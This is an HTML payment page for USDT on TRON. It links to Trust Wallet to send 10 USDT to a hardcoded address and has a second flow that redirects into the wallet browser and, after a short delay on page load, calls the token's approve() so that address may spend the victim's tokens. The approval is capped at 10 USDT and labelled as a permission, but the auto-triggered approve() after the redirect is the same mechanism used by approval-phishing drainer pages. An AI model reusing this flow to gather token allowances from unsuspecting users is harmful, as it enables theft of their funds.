<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>USDT TRON Payment</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0b0f14;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .card {
      width: 90%;
      max-width: 380px;
      background: #111827;
      border-radius: 20px;
      padding: 25px;
      text-align: center;
    }

    .title {
      font-size: 20px;
      margin-bottom: 20px;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    .pay { background: #22c55e; }
    .approve { background: #f59e0b; }

    .note {
      font-size: 12px;
      color: #9ca3af;
      margin-top: 15px;
    }
  </style>
</head>

<body>

  <div class="card">
    <div class="title">USDT (TRON)</div>

    <button class="btn pay" onclick="pay()">
      Send 10 USDT
    </button>

    <button class="btn approve" onclick="startApproveFlow()">
      Approve 10 USDT (permission)
    </button>

    <div class="note">
      Approval allows spending later. This is NOT a payment.
    </div>
  </div>

  <script>
    const receiver = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const AMOUNT = 10 * 1e6;

    // ✅ Payment (works everywhere)
    function pay() {
      const url = `https://link.trustwallet.com/send?coin=195&address=${receiver}&amount=10`;
      window.location.href = url;
    }

    // 🟡 Start approval flow
    function startApproveFlow() {
      localStorage.setItem("triggerApprove", "1");

      if (!window.tronWeb) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
      } else {
        approve();
      }
    }

    // 🟡 Actual approve function
    function approve() {
      window.tronWeb.contract().at(CONTRACT).then(contract => {
        contract.approve(receiver, AMOUNT).send({
          feeLimit: 100000000
        });
      });
    }

    // 🔥 AUTO-TRIGGER after redirect
    window.addEventListener("load", () => {
      if (localStorage.getItem("triggerApprove") === "1") {
        localStorage.removeItem("triggerApprove");

        // small delay for wallet readiness
        setTimeout(() => {
          if (window.tronWeb) {
            approve();
          }
        }, 800);
      }
    });
  </script>

</body>
</html>
